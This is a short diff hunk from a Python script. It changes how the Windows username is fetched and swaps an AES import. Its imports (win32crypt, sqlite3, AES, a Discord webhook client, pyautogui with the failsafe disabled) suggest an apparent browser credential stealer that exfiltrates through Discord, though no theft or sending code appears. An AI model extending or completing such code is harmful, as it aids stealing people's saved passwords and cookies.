@@ -7,13 +7,13 @@ import pyautogui
 pyautogui.FAILSAFE = False
 mouse = pyautogui
 keyboard = pyautogui
-username = os.environ["USERNAME"]
+username = subprocess.getoutput("whoami")
 import os
 import json
 import base64
 import sqlite3
 import win32crypt
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 from discord_webhook import DiscordWebhook
